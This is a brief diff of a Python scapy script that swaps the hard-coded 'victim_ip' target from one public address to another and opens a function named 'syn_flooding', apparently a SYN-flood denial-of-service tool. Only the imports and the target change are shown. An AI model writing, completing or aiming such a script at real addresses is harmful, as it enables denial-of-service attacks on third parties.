@@ -2,7 +2,7 @@ from scapy.all import IP, TCP, sr1, ICMP, send, DNS, DNSQR, UDP
 from scapy.layers.inet import RandShort
 import time
 
-victim_ip = "219.251.176.190"
+victim_ip = "183.100.236.245"
 
 def syn_flooding(ip):
     count = 0
